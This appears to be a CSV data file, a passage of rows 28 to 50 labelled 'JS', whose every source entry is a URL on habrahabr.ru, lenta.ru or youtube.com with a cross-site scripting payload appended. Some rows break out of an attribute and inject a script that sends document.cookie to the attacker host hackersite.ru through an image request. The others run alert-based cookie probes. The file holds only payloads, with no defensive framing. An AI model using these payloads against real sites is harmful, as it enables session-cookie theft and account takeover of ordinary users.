,language,source
28,JS,"https://habrahabr.ru/post/353994/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
29,JS,"https://www.youtube.com/watch?v=3ynp-s9Jipc»><script>alert(«cookie: «+document.cookie)</script>"
30,JS,"https://habrahabr.ru/post/353678/»><script>alert(«cookie: «+document.cookie)</script>"
31,JS,"https://habrahabr.ru/post/353872/»><script>alert(«cookie: «+document.cookie)</script>"
32,JS,"https://habrahabr.ru/company/mobio/blog/354078/»><script>alert(«cookie: «+document.cookie)</script>"
33,JS,"https://lenta.ru/photo/2018/04/22/armeniya/»><script>alert(«cookie: «+document.cookie)</script>"
34,JS,"https://lenta.ru/articles/2018/03/23/»><script>alert(«cookie: «+document.cookie)</script>"
35,JS,"https://lenta.ru/articles/2018/03/23/dark_skinned/»><script>alert(«cookie: «+document.cookie)</script>"
36,JS,"https://habrahabr.ru/company/toster/blog/354082/»><script>alert(«cookie: «+document.cookie)</script>"
37,JS,"https://habrahabr.ru/post/354044/»><script>alert(«cookie: «+document.cookie)</script>"
38,JS,"https://habrahabr.ru/post/354080/»><script>alert(«cookie: «+document.cookie)</script>"
39,JS,"https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
40,JS,"https://www.youtube.com/watch?v=ZnU5Cu_GR1o"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
41,JS,"https://habrahabr.ru/company/zfort/blog/354060/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
42,JS,"https://habrahabr.ru/company/1cloud/blog/353966/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
43,JS,"https://habrahabr.ru/company/yandex/blog/352098/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
44,JS,"https://lenta.ru/articles/2018/03/23/dark_skinned/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
45,JS,"https://habrahabr.ru/company/zfort/blog/354064/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
46,JS,"https://habrahabr.ru/post/353994/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
47,JS,"https://habrahabr.ru/company/pvs-studio/blog/354120/"><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
48,JS,"https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
49,JS,"https://habrahabr.ru/company/zfort/blog/354064/»><script>alert(«cookie: «+document.cookie)</script>"
50,JS,"https://lenta.ru/articles/2018/03/23/dark_skinned/»><script>alert(«cookie: «+document.cookie)</script>"
